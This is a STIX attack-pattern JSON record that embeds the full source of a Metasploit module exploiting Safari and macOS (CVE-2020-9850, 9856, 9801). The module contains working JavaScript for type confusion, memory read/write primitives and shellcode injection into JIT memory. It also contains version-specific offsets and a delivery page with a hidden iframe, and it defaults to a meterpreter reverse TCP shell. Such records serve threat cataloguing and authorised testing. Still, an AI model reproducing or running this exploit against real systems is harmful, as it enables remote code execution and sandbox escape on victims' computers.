{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--03f5b7d6-6742-4d52-afa7-3badfd8e2091",
    "created": "2024-08-14T16:34:30.73176Z",
    "modified": "2024-08-14T16:34:30.731764Z",
    "name": "Safari in Operator Side Effect Exploit",
    "description": " This module exploits an incorrect side-effect modeling of the 'in' operator. The DFG compiler assumes that the 'in' operator is side-effect free, however the <embed> element with the PDF plugin provides a callback that can trigger",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/browser/safari_in_operator_side_effect.rb",
            "external_id": "safari_in_operator_side_effect.rb"
        },
        {
            "source_name": "ThepayloadcanthenbeopenedwithCVE-2020-9801",
            "external_id": "executingthepayload"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-9801"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-9850"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-9856"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/sslab-gatech/pwn2own2020"
        },
        {
            "source_name": "stage0=exploit_dataCVE-2020-9850",
            "external_id": "stage0.bin"
        },
        {
            "source_name": "stage1=exploit_dataCVE-2020-9850",
            "external_id": "loader.bin"
        },
        {
            "source_name": "stage2=exploit_dataCVE-2020-9850",
            "external_id": "sbx.bin"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Post::File\n  include Msf::Exploit::Remote::HttpServer::BrowserExploit\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Safari in Operator Side Effect Exploit',\n        'Description' => %q{\n          This module exploits an incorrect side-effect modeling of the 'in' operator.\n          The DFG compiler assumes that the 'in' operator is side-effect free, however\n          the <embed> element with the PDF plugin provides a callback that can trigger\n          side-effects leading to type confusion (CVE-2020-9850).\n          The type confusion can be used as addrof and fakeobj primitives that then\n          lead to arbitrary read/write of memory. These primitives allow us to write\n          shellcode into a JIT region (RWX memory) containing the next stage of the\n          exploit.\n          The next stage uses CVE-2020-9856 to exploit a heap overflow in CVM Server,\n          and extracts a macOS application containing our payload into /var/db/CVMS.\n          The payload can then be opened with CVE-2020-9801, executing the payload\n          as a user but without sandbox restrictions.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Yonghwi Jin <jinmoteam[at]gmail.com>', # pwn2own2020\n          'Jungwon Lim <setuid0[at]protonmail.com>', # pwn2own2020\n          'Insu Yun <insu[at]gatech.edu>', # pwn2own2020\n          'Taesoo Kim <taesoo[at]gatech.edu>', # pwn2own2020\n          'timwr' # metasploit integration\n        ],\n        'References' => [\n          ['CVE', '2020-9801'],\n          ['CVE', '2020-9850'],\n          ['CVE', '2020-9856'],\n          ['URL', 'https://github.com/sslab-gatech/pwn2own2020'],\n        ],\n        'Notes' => {\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'SideEffects' => [ IOC_IN_LOGS ],\n          'Stability' => [CRASH_SAFE]\n        },\n        'DefaultTarget' => 0,\n        'DefaultOptions' => { 'WfsDelay' => 300, 'PAYLOAD' => 'osx/x64/meterpreter/reverse_tcp' },\n        'Targets' => [\n          [ 'Mac OS X x64 (Native Payload)', { 'Arch' => ARCH_X64, 'Platform' => [ 'osx' ] } ],\n          [ 'Python payload', { 'Arch' => ARCH_PYTHON, 'Platform' => [ 'python' ] } ],\n          [ 'Command payload', { 'Arch' => ARCH_CMD, 'Platform' => [ 'unix' ] } ],\n        ],\n        'DisclosureDate' => '2020-03-18'\n      )\n    )\n  end\n\n  def exploit_js\n    <<~JS\n      const DUMMY_MODE = 0;\n      const ADDRESSOF_MODE = 1;\n      const FAKEOBJ_MODE = 2;\n\n      function pwn() {\n        let otherWindow = document.getElementById('frame').contentWindow;\n        let innerDiv = otherWindow.document.querySelector('div');\n\n        if (!innerDiv) {\n          print(\"Failed to get innerDiv\");\n          return;\n        }\n\n        let embed = otherWindow.document.querySelector('embed');\n\n        otherWindow.document.body.removeChild(embed);\n        otherWindow.document.body.removeChild(otherWindow.annotationContainer);\n\n        const origFakeObjArr = [1.1, 1.1];\n        const origAddrOfArr = [2.2, 2.2];\n        let fakeObjArr = Array.from(origFakeObjArr);\n        let addressOfArr = Array.from(origAddrOfArr);\n        let addressOfTarget = {};\n\n        let sideEffectMode = DUMMY_MODE;\n        otherWindow.document.body.addEventListener('DOMSubtreeModified', () => {\n          if (sideEffectMode == DUMMY_MODE)\n            return;\n          else if (sideEffectMode == FAKEOBJ_MODE)\n            fakeObjArr[0] = {};\n          else if (sideEffectMode == ADDRESSOF_MODE)\n            addressOfArr[0] = addressOfTarget;\n        });\n\n        print('Callback is registered');\n\n        otherWindow.document.body.appendChild(embed);\n        let triggerArr;\n\n        function optFakeObj(triggerArr, arr, addr) {\n          arr[1] = 5.5;\n          let tmp = 0 in triggerArr;\n          arr[0] = addr;\n          return tmp;\n        }\n\n        function optAddrOf(triggerArr, arr) {\n          arr[1] = 6.6;\n          let tmp = 0 in triggerArr;\n          return [arr[0], tmp];\n        }\n\n        function prepare() {\n          triggerArr = [7.7, 8.8];\n          triggerArr.__proto__ = embed;\n          sideEffectMode = DUMMY_MODE;\n          for (var i = 0; i < 1e5; i++) {\n            optFakeObj(triggerArr, fakeObjArr, 9.9);\n            optAddrOf(triggerArr, addressOfArr);\n          }\n          delete triggerArr[0];\n        }\n\n        function cleanup() {\n          otherWindow.document.body.removeChild(embed);\n          otherWindow.document.body.appendChild(embed);\n\n          if (sideEffectMode == FAKEOBJ_MODE)\n            fakeObjArr = Array.from(origFakeObjArr);\n          else if (sideEffectMode == ADDRESSOF_MODE)\n            addressOfArr = Array.from(origAddrOfArr);\n\n          sideEffectMode = DUMMY_MODE;\n        }\n\n        function addressOf(obj) {\n          addressOfTarget = obj;\n          sideEffectMode = ADDRESSOF_MODE;\n          let ret = optAddrOf(triggerArr, addressOfArr)[0];\n          cleanup();\n          return Int64.fromDouble(ret);\n        }\n\n        function fakeObj(addr) {\n          sideEffectMode = FAKEOBJ_MODE;\n          optFakeObj(triggerArr, fakeObjArr, addr.asDouble());\n          let ret = fakeObjArr[0];\n          cleanup();\n          return ret;\n        }\n\n        prepare();\n        print(\"Prepare is done\");\n\n        let hostObj = {\n          _: 1.1,\n          length: (new Int64('0x4141414141414141')).asDouble(),\n          id: new Int64([\n            0, 0, 0, 0, // m_structureID\n            0x17,       // m_indexingType\n            0x19,       // m_type\n            0x08,       // m_flags\n            0x1         // m_cellState\n          ]).asJSValue(),\n          butterfly: 0,\n          o:1,\n          executable:{\n            a:1, b:2, c:3, d:4, e:5, f:6, g:7, h:8, i:9, // Padding (offset: 0x58)\n            unlinkedExecutable:{\n              isBuiltinFunction: 1 << 31,\n              b:0, c:0, d:0, e:0, f:0, g:0,              // Padding (offset: 0x48)\n              identifier: null\n            }\n          },\n          strlen_or_id: (new Int64('0x10')).asDouble(),\n          target: null\n        }\n\n        // Structure ID leak of hostObj.target\n        hostObj.target=hostObj\n\n        var hostObjRawAddr = addressOf(hostObj);\n        var hostObjBufferAddr = Add(hostObjRawAddr, 0x20)\n        var fakeHostObj = fakeObj(hostObjBufferAddr);\n        var fakeIdentifier = fakeObj(Add(hostObjRawAddr, 0x40));\n\n        hostObj.executable.unlinkedExecutable.identifier=fakeIdentifier\n        let rawStructureId=Function.prototype.toString.apply(fakeHostObj)\n\n        let leakStructureId=Add(new Int64(\n          rawStructureId[9].charCodeAt(0)+rawStructureId[10].charCodeAt(0)*0x10000\n          ), new Int64([\n            0, 0, 0, 0, // m_structureID\n            0x07,       // m_indexingType\n            0x22,       // m_type\n            0x06,       // m_flags\n            0x1         // m_cellState\n        ]))\n        print('Leaked structure ID: ' + leakStructureId);\n\n        hostObj.strlen_or_id = hostObj.id = leakStructureId.asDouble();\n        hostObj.butterfly = fakeHostObj;\n\n        addressOf = function(obj) {\n          hostObj.o = obj;\n          return Int64.fromDouble(fakeHostObj[2]);\n        }\n\n        fakeObj = function(addr) {\n          fakeHostObj[2] = addr.asDouble();\n          return hostObj.o;\n        }\n\n        print('Got reliable addressOf/fakeObj');\n\n        let rwObj = {\n          _: 1.1,\n          length: (new Int64('0x4141414141414141')).asDouble(),\n          id: leakStructureId.asDouble(),\n          butterfly: 1.1,\n\n          __: 1.1,\n          innerLength: (new Int64('0x4141414141414141')).asDouble(),\n          innerId: leakStructureId.asDouble(),\n          innerButterfly: 1.1,\n        }\n\n        var rwObjBufferAddr = Add(addressOf(rwObj), 0x20);\n        var fakeRwObj = fakeObj(rwObjBufferAddr);\n        rwObj.butterfly = fakeRwObj;\n\n        var fakeInnerObj = fakeObj(Add(rwObjBufferAddr, 0x20));\n        rwObj.innerButterfly = fakeInnerObj;\n\n\n        function read64(addr) {\n          // We use butterfly and it depends on its size in -1 index\n          // Thus, we keep searching non-zero value to read value\n          for (var i = 0; i < 0x1000; i++) {\n            fakeRwObj[5] = Sub(addr, -8 * i).asDouble();\n            let value = fakeInnerObj[i];\n            if (value) {\n              return Int64.fromDouble(value);\n            }\n          }\n          throw 'Failed to read: ' + addr;\n        }\n\n        function write64(addr, value) {\n          fakeRwObj[5] = addr.asDouble();\n          fakeInnerObj[0] = value.asDouble();\n        }\n\n        function makeJITCompiledFunction() {\n          var obj = {};\n          // Some code to avoid inlining...\n          function target(num) {\n            num ^= Math.random() * 10000;\n            num ^= 0x70000001;\n            num ^= Math.random() * 10000;\n            num ^= 0x70000002;\n            num ^= Math.random() * 10000;\n            num ^= 0x70000003;\n            num ^= Math.random() * 10000;\n            num ^= 0x70000004;\n            num ^= Math.random() * 10000;\n            num ^= 0x70000005;\n            num ^= Math.random() * 10000;\n            num ^= 0x70000006;\n            num ^= Math.random() * 10000;\n            num ^= 0x70000007;\n            num ^= Math.random() * 10000;\n            num ^= 0x70000008;\n            num ^= Math.random() * 10000;\n            num ^= 0x70000009;\n            num ^= Math.random() * 10000;\n            num ^= 0x7000000a;\n            num ^= Math.random() * 10000;\n            num ^= 0x7000000b;\n            num ^= Math.random() * 10000;\n            num ^= 0x7000000c;\n            num ^= Math.random() * 10000;\n            num ^= 0x7000000d;\n            num ^= Math.random() * 10000;\n            num ^= 0x7000000e;\n            num ^= Math.random() * 10000;\n            num ^= 0x7000000f;\n            num ^= Math.random() * 10000;\n            num ^= 0x70000010;\n            num ^= Math.random() * 10000;\n            num ^= 0x70000011;\n            num ^= Math.random() * 10000;\n            num ^= 0x70000012;\n            num ^= Math.random() * 10000;\n            num ^= 0x70000013;\n            num ^= Math.random() * 10000;\n            num ^= 0x70000014;\n            num ^= Math.random() * 10000;\n            num ^= 0x70000015;\n            num ^= Math.random() * 10000;\n            num ^= 0x70000016;\n            num ^= Math.random() * 10000;\n            num ^= 0x70000017;\n            num ^= Math.random() * 10000;\n            num ^= 0x70000018;\n            num ^= Math.random() * 10000;\n            num ^= 0x70000019;\n            num ^= Math.random() * 10000;\n            num ^= 0x7000001a;\n            num ^= Math.random() * 10000;\n            num ^= 0x7000001b;\n            num ^= Math.random() * 10000;\n            num ^= 0x7000001c;\n            num ^= Math.random() * 10000;\n            num ^= 0x7000001d;\n            num ^= Math.random() * 10000;\n            num ^= 0x7000001e;\n            num ^= Math.random() * 10000;\n            num ^= 0x7000001f;\n            num ^= Math.random() * 10000;\n            num ^= 0x70000020;\n            num ^= Math.random() * 10000;\n            num &= 0xffff;\n            return num;\n          }\n\n          // Force JIT compilation.\n          for (var i = 0; i < 1000; i++) {\n            target(i);\n          }\n          for (var i = 0; i < 1000; i++) {\n            target(i);\n          }\n          for (var i = 0; i < 1000; i++) {\n            target(i);\n          }\n          return target;\n        }\n\n        function getJITCodeAddr(func) {\n          var funcAddr = addressOf(func);\n          print(\"Target function @ \" + funcAddr.toString());\n          var executableAddr = read64(Add(funcAddr, 3 * 8));\n          print(\"Executable instance @ \" + executableAddr.toString());\n\n          var jitCodeAddr = read64(Add(executableAddr, 3 * 8));\n          print(\"JITCode instance @ \" + jitCodeAddr.toString());\n\n          if (And(jitCodeAddr, new Int64('0xFFFF800000000000')).toString() != '0x0000000000000000' ||\n              And(Sub(jitCodeAddr, new Int64('0x100000000')), new Int64('0x8000000000000000')).toString() != '0x0000000000000000') {\n            jitCodeAddr = Add(ShiftLeft(read64(Add(executableAddr, 3 * 8 + 1)), 1), 0x100);\n            print(\"approx. JITCode instance @ \" + jitCodeAddr.toString());\n          }\n\n          return jitCodeAddr;\n        }\n\n        function setJITCodeAddr(func, addr) {\n          var funcAddr = addressOf(func);\n          print(\"Target function @ \" + funcAddr.toString());\n          var executableAddr = read64(Add(funcAddr, 3 * 8));\n          print(\"Executable instance @ \" + executableAddr.toString());\n          write64(Add(executableAddr, 3 * 8), addr);\n        }\n\n        function getJITFunction() {\n          var shellcodeFunc = makeJITCompiledFunction();\n          shellcodeFunc();\n          var jitCodeAddr = getJITCodeAddr(shellcodeFunc);\n          return [shellcodeFunc, jitCodeAddr];\n        }\n\n        var [_JITFunc, rwxMemAddr] = getJITFunction();\n\n        for (var i = 0; i < stage0.length; i++)\n          write64(Add(rwxMemAddr, i), new Int64(stage0[i]));\n\n        setJITCodeAddr(alert, rwxMemAddr);\n        var argv = {\n          a0: stage1Arr,\n          a1: stage2Arr,\n          doc: document,\n          a2: 0x41414141,\n          a3: 0x42424242,\n          a4: 0x43434343,\n        };\n        alert(argv);\n      }\n\n      var ready = new Promise(function(resolve) {\n        if (typeof(window) === 'undefined')\n          resolve();\n        else\n          window.onload = function() {\n            resolve();\n          }\n      });\n\n      ready.then(function() {\n        try {\n          pwn()\n        } catch (e) {\n          print(\"Exception caught: \" + e);\n          location.reload();\n        }\n      }).catch(function(err) {\n        print(\"Initializatin failed\");\n      });\n    JS\n  end\n\n  def offset_table\n    {\n      'placeholder' => {\n        jsc_confstr_stub: 0x0FF5370041414141,\n        jsc_llint_entry_call: 0x0FF5370041414142,\n        libsystem_c_confstr: 0x0FF5370041414143,\n        libsystem_c_dlopen: 0x0FF5370041414144,\n        libsystem_c_dlsym: 0x0FF5370041414145\n      },\n      '10.15.3' => {\n        jsc_confstr_stub: 0xE7D8B4,\n        jsc_llint_entry_call: 0x361f13,\n        libsystem_c_confstr: 0x2644,\n        libsystem_c_dlopen: 0x80430,\n        libsystem_c_dlsym: 0x80436\n      },\n      '10.15.4' => {\n        jsc_confstr_stub: 0xF96446,\n        jsc_llint_entry_call: 0x380a1d,\n        libsystem_c_confstr: 0x2be4,\n        libsystem_c_dlopen: 0x8021e,\n        libsystem_c_dlsym: 0x80224\n      }\n    }\n  end\n\n  def get_offsets(user_agent)\n    if user_agent =~ /Intel Mac OS X (.*?)\\)/\n      osx_version = Regexp.last_match(1).gsub('_', '.')\n      if user_agent =~ %r{Version/(.*?) }\n        if Rex::Version.new(Regexp.last_match(1)) > Rex::Version.new('13.1')\n          print_warning \"Safari version #{Regexp.last_match(1)} is not vulnerable\"\n          return false\n        else\n          print_good \"Safari version #{Regexp.last_match(1)} appears to be vulnerable\"\n        end\n      end\n      mac_osx_version = Rex::Version.new(osx_version)\n      if mac_osx_version >= Rex::Version.new('10.15.5')\n        print_warning \"macOS version #{mac_osx_version} is not vulnerable\"\n      elsif mac_osx_version < Rex::Version.new('10.14')\n        print_warning \"macOS version #{mac_osx_version} is not supported\"\n      elsif offset_table.key?(osx_version)\n        return offset_table[osx_version]\n      else\n        print_warning \"No offsets for version #{mac_osx_version}\"\n      end\n    else\n      print_warning 'Unexpected User-Agent'\n    end\n    return false\n  end\n\n  def on_request_uri(cli, request)\n    user_agent = request['User-Agent']\n    print_status(\"Request #{request.uri} from #{user_agent}\")\n    if request.uri.ends_with? '.pdf'\n      send_response(cli, '', { 'Content-Type' => 'application/pdf' })\n      return\n    end\n\n    offsets = get_offsets(user_agent)\n    unless offsets\n      send_not_found(cli)\n      return\n    end\n\n    utils = exploit_data 'javascript_utils', 'utils.js'\n    int64 = exploit_data 'javascript_utils', 'int64.js'\n    stage0 = exploit_data 'CVE-2020-9850', 'stage0.bin'\n    stage1 = exploit_data 'CVE-2020-9850', 'loader.bin'\n    stage2 = exploit_data 'CVE-2020-9850', 'sbx.bin'\n\n    offset_table['placeholder'].each do |k, v|\n      placeholder_index = stage1.index([v].pack('Q'))\n      stage1[placeholder_index, 8] = [offsets[k]].pack('Q')\n    end\n\n    case target['Arch']\n    when ARCH_X64\n      root_payload = payload.encoded\n    when ARCH_PYTHON\n      root_payload = \"CMD:echo \\\"#{payload.encoded}\\\" | python\"\n    when ARCH_CMD\n      root_payload = \"CMD:#{payload.encoded}\"\n    end\n    if root_payload.length > 1024\n      fail_with Failure::PayloadFailed, \"Payload size (#{root_payload.length}) exceeds space in payload placeholder\"\n    end\n    placeholder_index = stage2.index('ROOT_PAYLOAD_PLACEHOLDER')\n    stage2[placeholder_index, root_payload.length] = root_payload\n    payload_js = <<~JS\n      const stage0 = [\n        #{Rex::Text.to_num(stage0)}\n      ];\n      var stage1Arr = new Uint8Array([#{Rex::Text.to_num(stage1)}]);\n      var stage2Arr = new Uint8Array([#{Rex::Text.to_num(stage2)}]);\n    JS\n\n    jscript = <<~JS\n      #{utils}\n      #{int64}\n      #{payload_js}\n      #{exploit_js}\n    JS\n\n    jscript = add_debug_print_js(jscript)\n    pdfpath = datastore['URIPATH'] || get_resource\n    pdfpath += '/' unless pdfpath.end_with? '/'\n    pdfpath += \"#{Rex::Text.rand_text_alpha(4..8)}.pdf\"\n\n    html = <<~HTML\n      <html>\n        <head>\n          <style>\n            body {\n              margin: 0;\n            }\n            iframe {\n              display: none;\n            }\n          </style>\n        </head>\n        <body>\n          <iframe id=frame width=10% height=10% src=\"#{pdfpath}\"></iframe>\n          <script>\n          #{jscript}\n          </script>\n        </body>\n      </html>\n    HTML\n\n    send_response(cli, html, { 'Content-Type' => 'text/html', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0' })\n  end\n\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2020-03-18"
}